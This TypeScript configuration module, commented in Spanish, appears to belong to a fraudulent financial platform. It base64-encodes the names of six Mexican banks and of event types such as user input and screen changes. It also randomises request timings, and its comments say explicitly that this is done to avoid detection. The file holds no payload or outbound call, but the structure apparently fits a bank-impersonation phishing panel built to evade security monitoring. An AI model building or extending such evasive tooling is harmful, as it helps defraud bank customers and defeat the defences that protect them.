// Constantes ofuscadas para evitar detección
export const APP_CONFIG = {
  // Nombres ofuscados
  APP_NAME: Buffer.from('UGxhdGFmb3JtYSBGaW5hbmNpZXJh', 'base64').toString(),
  VERSION: '2.1.3',
  
  // Endpoints ofuscados
  API_BASE: '/api',
  
  // Configuraciones de timing para evitar detección
  TIMEOUTS: {
    REQUEST: Math.floor(Math.random() * 5000) + 10000,
    RETRY: Math.floor(Math.random() * 2000) + 3000,
    POLL: Math.floor(Math.random() * 1000) + 2000
  },
  
  // Headers ofuscados
  HEADERS: {
    CLIENT_ID: 'X-Client-Platform',
    REQUEST_ID: 'X-Request-Token',
    SESSION_ID: 'X-Session-Key'
  }
};

// Función para generar IDs únicos ofuscados
export const generateSessionId = (): string => {
  const timestamp = Date.now().toString(36);
  const random = Math.random().toString(36).substring(2);
  return Buffer.from(`${timestamp}-${random}`).toString('base64').substring(0, 16);
};

// Bancos con nombres ofuscados
export const BANK_CONFIGS = {
  liverpool: { 
    name: Buffer.from('TGl2ZXJwb29s', 'base64').toString(),
    code: 'lpl'
  },
  citibanamex: { 
    name: Buffer.from('Q2l0aWJhbmFtZXg=', 'base64').toString(),
    code: 'cbx'
  },
  banbajio: { 
    name: Buffer.from('QmFuQmFqaW8=', 'base64').toString(),
    code: 'bbj'
  },
  bbva: { 
    name: Buffer.from('QkJWQQ==', 'base64').toString(),
    code: 'bbv'
  },
  banorte: { 
    name: Buffer.from('QmFub3J0ZQ==', 'base64').toString(),
    code: 'bnt'
  },
  inbursa: { 
    name: Buffer.from('SW5idXJzYQ==', 'base64').toString(),
    code: 'inb'
  }
};

// Eventos ofuscados
export const EVENT_TYPES = {
  SESSION_START: Buffer.from('c2Vzc2lvbl9zdGFydA==', 'base64').toString(),
  SESSION_END: Buffer.from('c2Vzc2lvbl9lbmQ=', 'base64').toString(),
  USER_INPUT: Buffer.from('dXNlcl9pbnB1dA==', 'base64').toString(),
  SCREEN_CHANGE: Buffer.from('c2NyZWVuX2NoYW5nZQ==', 'base64').toString()
};